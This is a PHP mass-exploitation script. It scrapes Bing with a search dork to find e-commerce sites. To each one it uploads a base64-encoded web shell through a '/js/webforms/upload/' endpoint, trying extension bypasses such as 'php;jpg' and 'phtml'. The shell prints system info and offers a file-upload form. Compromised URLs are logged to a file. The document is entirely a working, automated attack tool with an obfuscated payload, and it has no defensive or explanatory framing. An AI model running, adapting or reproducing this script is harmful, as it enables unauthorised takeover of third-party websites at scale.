<?php

error_reporting(0);
set_time_limit(0);
$dork = "seo_sitemap + Fashion";
echo "Scanning Dork : ".$dork."\n";
$get = SearchEngine($dork);
foreach ($get as $urls){
$victim = parse_url($urls);
$domain = $victim['host'];
echo "[+] Scaning : $domain \n";
if(!file_exists("sj.php"))
{
$ext = createshell();
}
else
{
    $ext = array("php","php5","php.xxxjpg","phtml","php7","php.png","php.j","php;jpg","php;gif");
}
for($i=0;$i<count($ext);$i++)
{
$exploit = revup($domain,"sj.".$ext[$i]);
if($exploit !== false)
{
    echo $exploit."\n";

}
else
{
    echo "http://".$domain." not vuln\n";
}
}
}


function CurlPost($url, $post = false){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        if($post !== false){
            $isi = '';
            foreach($post as $key=>$value){
                $isi .= $key.'='.$value.'&';
            }
            rtrim($isi, '&');
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, count($isi));
            curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
        }
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }

function SearchEngine($dorks)
{
for($i=0;$i<=1000;$i+=10){
                    $search = CurlPost("http://www.bing.com/search?q=".urlencode($dorks)."&first=".$i);
                    preg_match_all('#<h2><a href="(.*?)" h="ID#', $search, $m);
                    foreach($m[1] as $link){
                        if(!preg_match("/live|msn|bing|microsoft/",$link)){
                            if(!in_array($link,$list)){
                                $list[] = $link;
                                
                            }
                            
                        }
                    }
                    echo "[".date("H:i:s")."] Menemukan (".count(array_unique($m[1])).")\n";
                }
                echo "Total site ".count($list)."\n";
                return $list;
}
function revup($url,$file)
{
$post = array('files[]'=>"@$file") ;
$ch = curl_init();
curl_setopt ($ch, CURLOPT_URL, "$url/js/webforms/upload/");
curl_setopt ($ch, CURLOPT_USERAGENT, "msnbot/1.0 (+http://search.msn.com/msnbot.htm)");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,$post);
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
$data = curl_exec($ch);
curl_close($ch);
$json = json_decode($data);
if($json[0]->url){
$fp = fopen("hasil.txt", 'a+');
             fwrite($fp, $json[0]->url."\n");
             fclose($fp);
return $json[0]->url;

             }
             else
             {
                return false;

             }
}
function createshell()
{
$ext = array("php","php5","phtml","php.jpg","php.png","php.j","php;jpg","php;gif");
$shell = "PD9waHANCmVjaG8gIkluZG9YcGxvaXQgLSBBdXRvIFhwbG9pdGVyIjsNCmVjaG8gIjxicj4iLnBocF91bmFtZSgpLiI8YnI+IjsNCmVjaG8gIjxmb3JtIG1ldGhvZD0ncG9zdCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+DQo8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0naWR4Jz48aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd1cGxvYWQnIHZhbHVlPSd1cGxvYWQnPg0KPC9mb3JtPiI7DQppZigkX1BPU1RbJ3VwbG9hZCddKSB7DQoJaWYoQGNvcHkoJF9GSUxFU1snaWR4J11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2lkeCddWyduYW1lJ10pKSB7DQoJZWNobyAic3Vrc2VzIjsNCgl9IGVsc2Ugew0KCWVjaG8gImdhZ2FsIjsNCgl9DQp9DQo/Pg==";
for($i=0;$i<count($ext);$i++)
{
$fp = fopen("sj.".$ext[$i], 'a+');
             fwrite($fp, base64_decode($shell));
             fclose($fp);

}
return $ext;
}
